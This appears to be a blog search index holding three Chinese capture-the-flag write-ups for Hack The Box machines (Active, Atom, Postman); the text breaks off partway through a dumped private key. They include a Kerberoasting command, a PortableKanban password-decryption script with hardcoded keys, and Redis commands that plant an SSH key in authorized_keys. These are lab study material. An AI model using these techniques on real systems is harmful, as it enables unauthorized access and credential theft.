<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Active</title>
    <url>/2021/12/24/Active/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/eda8a039099d4943bbdadeca0b30a10a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到主机开放了135,445,88这些常见的端口<br><img src="https://img-blog.csdnimg.cn/5cf14b42521c4a969e73a389b2407517.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>可以匿名登录smb服务<br><img src="https://img-blog.csdnimg.cn/e3d0be21298842868f97f94a04e6481e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>我们看到存在一个<code>Replication</code>的目录，我们尝试登录进这个目录看看。发现存在<code>active.htb</code>目录，并且该目录下有几个有价值的目录信息<br><img src="https://img-blog.csdnimg.cn/5539c4e4a9ad4b5da24575f1cae90b36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我经过细心查看后，只有在<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>目录下找到一个<code>Groups.xml</code>文件，经过查看这是一个组策略文件，用于帐户管理的组策略存储在域控制器上的“Groups.xml”文件中，该文件隐藏在 SYSVOL 文件夹中。<br><img src="https://img-blog.csdnimg.cn/3dfeaf7a43274b6db80c1986b56c764c.png?x-oss-process=image/watermark,type%EE%80%86ZHJvaWRzYW5zZmFsbGJhY2s,shadow%EE%80%8650,text%EE%80%86Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size%EE%80%8620,color%EE%80%86FFFFFF,t%EE%80%8670,g%EE%80%86se,x%EE%80%8616" alt="在这里插入图片描述"><br>因为这个文件使用了特殊的算法进行加密的，所以我们可以使用<code>gpp-decrypt.py</code>这个脚本进行解密，解密出来的结果如下图所示<br><img src="https://img-blog.csdnimg.cn/3b1d134c71474bf78e60b56c7094f613.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>有了账户和密码后，我们登录SMB服务可以查看更多的共享<br><img src="https://img-blog.csdnimg.cn/a0cabca528234f819d7f3fac04fd95c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们使用账户密码访问Users共享<br><img src="https://img-blog.csdnimg.cn/3d172d64bc1c426399eefb0f548f5fff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在桌面上找到第一个答案值<br><img src="https://img-blog.csdnimg.cn/9465fa15bea246989886ef686a471ddc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们使用<code>rpcclient</code>枚举用户名和用户组<br><img src="https://img-blog.csdnimg.cn/fe3c3ce5801a4fca8ff2eae28e6cc801.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用<code>GetUserSPNs.py</code>脚本获取与普通用户帐户关联的服务主体名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/18a215bbad5044eea14f81afb92ed4a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们获取到哈希值后，使用john来破解得到明文密码。<br><img src="https://img-blog.csdnimg.cn/fefaa6cda3e74dbf93337c78a2fededc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>现在我们有了管理员的凭据后，可以先看看管理员可以访问哪些共享。可以看到，我们可以访问C盘的共享<br><img src="https://img-blog.csdnimg.cn/ddc1a806b114476996349f7104571698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用账号密码登录进入C盘目录<br><img src="https://img-blog.csdnimg.cn/44b03ce98746402491959058ebfaa443.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>并在桌面上查找到root.txt文件<br><img src="https://img-blog.csdnimg.cn/cdd2ab04ba094a5b9ec52a984a7b800f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Atom</title>
    <url>/2021/12/24/Atom/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/d7ff3a26ad1b4b0680f0d4283d757a77.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到靶机开放了80端口，那证明就存在web服务。<br><img src="https://img-blog.csdnimg.cn/71d80ba7cc3748c4a4f0402a9793083a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/458004df73e046d6ac29665f942ae2a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>往下看的时候，发现guest用户可以登录smb服务，那我们就先看看smb服务里边都有哪些有价值的信息。<br><img src="https://img-blog.csdnimg.cn/35ce3f11c2ea4febac8767c3761d9f0f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>使用匿名登录看看可以访问到哪些信息，可以看到具有读写权限的目录只有<code>Software_Updates</code>这个目录<br><img src="https://img-blog.csdnimg.cn/901c2bdb6d4d4e7da7675e1c24ee1e36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们登录进这个目录中，有一个pdf文件可以下载，我们下载查看了下里面的内容。<br><img src="https://img-blog.csdnimg.cn/2ecb65835531481289d535ee549568a4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1edacfc8f7844517bae4f0e7dbd97af0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>查看完这些信息后，我们继续访问web服务。在服务的底端存在一个邮箱账号和域名，我们先添加到hosts文件中，便于后面进行目录爆破和子域名的搜集。<br><img src="https://img-blog.csdnimg.cn/35cf8a81609b4187930f03c62fcf602d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就使用<code>gobuster</code>进行域名和目录的爆破吧<br><img src="https://img-blog.csdnimg.cn/916619d4e1dc4bfba3e44627be4f0f36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b59b2cb6beb94f13bd94e36d031e5dba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现好像并没有什么有价值的信息，哎！还是老老实实去下载软件吧。。。<br><img src="https://img-blog.csdnimg.cn/cc46996341604dffb098519776c2cfc8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现是个exe程序，那我们把它丢Windows上运行看看效果是怎么样的<br><img src="https://img-blog.csdnimg.cn/aea7a78db0594a95b20e01811fc600ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在yml文件中发现了这是一个电子应用程序<br><img src="https://img-blog.csdnimg.cn/1447b123093e4cf79c5fbdf992c90238.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们根据搜索到的信息，上谷歌进行搜索，可以看到有一位大佬发现了这个漏洞<br><img src="https://img-blog.csdnimg.cn/d4b8f3b4ba784683918c21291c351027.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3576872644644aef95d67125deffcd4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>大佬已经给出了漏洞利用的方法，首先先使用包含单引号的文件名，然后重新计算文件哈希以匹配攻击者提供的二进制文件。<br><img src="https://img-blog.csdnimg.cn/2ce2ad37d7314f4781ca47e3372b791c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先我们先生成一个带有单引号的有效载荷<br><img src="https://img-blog.csdnimg.cn/841300482268465f928a7a1c6029c243.png" alt="在这里插入图片描述"><br>然后我们按照上面的方法，生成一个 sha512 sum hash 并将其转换为十六进制，然后进一步转换为base64<br><img src="https://img-blog.csdnimg.cn/5222e5c555ae452499acff13d2f7999a.png" alt="在这里插入图片描述"><br>然后我们新建latest.yml这个文件，将上面生成的值进行复制粘贴<br><img src="https://img-blog.csdnimg.cn/d5c11c4ee72b45f09ef3842b265aec6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>紧接着我们使用python开启一个服务器<br><img src="https://img-blog.csdnimg.cn/6a8bfdbfe08e4dbaad426ef2204b19f0.png" alt="在这里插入图片描述"><br>三个文件夹都要替换掉yml文件<br><img src="https://img-blog.csdnimg.cn/51201bef231a46a9a2b2221c45ffeb40.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/99de167220ab45808c982e771e32f731.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们在msf上对漏洞进行利用，设置好基本参数后，我们可以看到反弹的shell<br><img src="https://img-blog.csdnimg.cn/8cd39b8f18d34046a6a3a1abd41d1bd4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2ffa34dc528d4bffbf22bbff28573e83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们先查看一下当前用户的权限</p>
<p><img src="https://img-blog.csdnimg.cn/46fc63e01a074f8780b9977a64491034.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入cmd终端进行操作<br><img src="https://img-blog.csdnimg.cn/572df466d9dd4791a92d255ca60aa7a7.png" alt="在这里插入图片描述"><br>进入<code>Program Files</code>这个目录查看主机都安装了哪些应用程序。可以看到安装了Redis数据库，是不是想试试未授权访问？这是直觉哈哈<br><img src="https://img-blog.csdnimg.cn/9a3ff33f781548e7be38f9fbb77d972b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们先进入这个目录，看看配置文件是否需要密码进行登录的。我们查找<code>redis.windows-service.conf</code>这个文件，使用命令<code>type redis.windows-service.conf | findstr requirepass</code>快速查找到登录数据库的密码<br><img src="https://img-blog.csdnimg.cn/bb3958f354d14907842c4a54f90141be.png" alt="在这里插入图片描述"><br>既然发现了密码，那我们直接尝试可不可以登录成功吧<br><img src="https://img-blog.csdnimg.cn/73ef19ef23b04f979996089529a2ec3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们列出所有的hash看看，发现了一个比较有价值的信息<br><img src="https://img-blog.csdnimg.cn/21d54e0c5d914c8ea4288315af18521b.png" alt="在这里插入图片描述"><br>那我们查看一下user对应的信息，发现是一个管理员，并且还挖掘到了他对应的hash值<code>Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi</code><br><img src="https://img-blog.csdnimg.cn/3bf1bf2cbfb6417c9058a3d05d874987.png" alt="在这里插入图片描述"><br>既然涉及到用户信息，那我们就去Users目录下看看有没有什么有价值的信息吧。然而在jason的桌面上，我们看到了user.txt文件，拿到第一个flag值<img src="https://img-blog.csdnimg.cn/806ca1c22ee14f7fa5bb5688113ff486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="t"><br>在jason的主机中，我们发现了他安装了两个应用程序，一个是<code>node_modules</code>和<code>PortableKanban</code><br><img src="https://img-blog.csdnimg.cn/171f022c449c4fdda60d7e6c67bca7a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1bc9495245b24508b8408bee3570a7e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看一下cfg配置文件，发现了对应的hash值<code>Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb</code><br><img src="https://img-blog.csdnimg.cn/96ad43ed232e4c928dfb0b255cf0b550.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们在exploit-db中搜索到对应的漏洞利用代码<br><img src="https://img-blog.csdnimg.cn/c205078ffcc14aff81bba88d60aa34ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们对这个利用脚本进行简洁，让它直接输出对应的明文值。得到明文值<code>kidvscat_yes_kidvscat</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment">#python3 -m pip install des</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">        <span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&#x27;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/938feaacbc2d46888b987f570b3a166f.png" alt="在这里插入图片描述"></p>
<p>登录成功<br><img src="https://img-blog.csdnimg.cn/020f2b5f8b624d2b9420511bc70c6941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>SMB</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Postman(Redis未授权访问)</title>
    <url>/2021/12/24/Postman/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标开放了22、80、6379等常见端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root💀kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">└─<span class="comment"># ./nmap.sh 10.10.10.160</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 07:32 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 42.85 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>我们访问一下web服务，发现只是一个普通的web页面而已<img src="https://img-blog.csdnimg.cn/31925c3c4c634d4c8dfa4491466b77e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们模糊一下网站路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://10.10.10.160&quot; -e * -x404,403,500</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                        </span><br><span class="line">                                                                                                                                               </span><br><span class="line">Extensions: nmap.sh | HTTP method: GET | Threads: 30 | Wordlist size: 8979</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/10.10.10.160/_21-11-30_07-47-35.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-21-11-30_07-47-35.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.160/</span><br><span class="line">                                                                                                                                               </span><br><span class="line">[07:47:35] Starting: </span><br><span class="line">[07:48:35] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                                             </span><br><span class="line">[07:48:44] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                                             </span><br><span class="line">[07:48:48] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/                        </span><br><span class="line">[07:48:48] 200 -    2KB - /images/</span><br><span class="line">[07:48:50] 200 -    4KB - /index.html                                                                                                 </span><br><span class="line">[07:48:51] 200 -    3KB - /js/                                                                                                              </span><br><span class="line">[07:48:52] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                   </span><br><span class="line">[07:49:25] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/                                                                       </span><br><span class="line">[07:49:27] 200 -    8KB - /upload/                                                                          </span><br><span class="line">                                                                                                                       </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<!--more-->

<p>我们发现一个upload目录，访问发现只有一些图片而已<br><img src="https://img-blog.csdnimg.cn/b3c145006edb4713a933104a79cae707.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>web攻击无果，那我们将注意力转移到redis数据库上，尝试是否存在未授权访问漏洞<br><img src="https://img-blog.csdnimg.cn/f8887a8690934a50aefef93ab24f104a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们首先将我们的ssh-key写入到key.txt文件中<br><img src="https://img-blog.csdnimg.cn/30cc35f7466642ae8fc852db4f111dc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再把key.txt文件内容写入redis缓存中<br><img src="https://img-blog.csdnimg.cn/3f83ac49ad7546059774aba3c56a198e.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.160:6379&gt; config get dir</span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/var/lib/redis&quot;</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> /var/lib/redis/.ssh</span><br><span class="line">(error) ERR Wrong number of arguments <span class="keyword">for</span> CONFIG <span class="built_in">set</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>我们尝试登录到该主机上<br><img src="https://img-blog.csdnimg.cn/795ba910f639419d8987d79f0ec483b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们上传linpeas.sh脚本到目标主机上发现，主机的/opt目录上存在一份私钥备份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis@Postman:~$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span 